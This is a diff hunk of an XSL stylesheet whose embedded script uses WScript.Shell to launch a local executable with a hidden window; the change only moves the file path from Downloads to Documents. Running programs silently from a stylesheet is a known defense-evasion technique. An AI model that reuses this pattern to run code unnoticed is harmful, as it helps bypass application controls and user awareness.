@@ -8,7 +8,7 @@ version="1.0">
 	<![CDATA[
 	var oShell = new ActiveXObject("WScript.Shell");
 	var homeDir = oShell.ExpandEnvironmentStrings("%USERPROFILE%");
-	var commandtoRun = homeDir + "\\Downloads\\myProjects\\app.exe";
+	var commandtoRun = homeDir + "\\Documents\\myProjects\\app.exe";
 	oShell.Run(commandtoRun,0);
 	]]> </ms:script>
 </stylesheet>
